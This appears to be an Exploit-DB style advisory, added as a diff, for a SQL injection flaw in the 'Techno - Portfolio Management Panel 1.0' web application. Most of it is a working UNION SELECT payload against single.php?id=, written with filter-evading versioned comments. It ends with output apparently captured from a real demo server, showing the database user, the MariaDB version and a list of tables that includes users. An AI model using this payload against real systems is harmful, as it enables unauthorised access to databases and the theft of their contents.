@@ -1,0 +1,43 @@
+# # # # # 
+# Exploit Title: Techno - Portfolio Management Panel 1.0 - SQL Injection
+# Dork: N/A
+# Date: 02.12.2017
+# Vendor Homepage: https://codecanyon.net/user/engtechno
+# Software Link: https://codecanyon.net/item/techno-portfolio-management-panel/20919551
+# Demo: http://dacy.esy.es/eng/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/single.php?id=[SQL]
+# 
+# -14++/*!08888UNION*/(/*!08888SELECT*/0x283129,0x283229,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),0x283429,0x283529,0x283629,0x283729,(/*!08888SELECT*/+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+/*!08888FROM*/+INFORMATION_SCHEMA.TABLES+/*!08888WHERE*/+TABLE_SCHEMA=DATABASE()),0x283929,0x28313029,0x28313129,0x28313229,0x28313329)--+-
+# 
+# Etc..
+# # # # #
+
+
+
+http://server/single.php?id=-14++/*!08888UNION*/(/*!08888SELECT*/0x283129,0x283229,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),0x283429,0x283529,0x283629,0x283729,(/*!08888SELECT*/+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+/*!08888FROM*/+INFORMATION_SCHEMA.TABLES+/*!08888WHERE*/+TABLE_SCHEMA=DATABASE()),0x283929,0x28313029,0x28313129,0x28313229,0x28313329)--+-
+
+u633631124_dacy@server : u633631124_dacy : 10.1.24-MariaDB
+
+(7)categories
+feedback
+messages
+notes
+portfolio
+settings
+uploads
+users
+wp_commentmeta
+wp_comments
+etc....
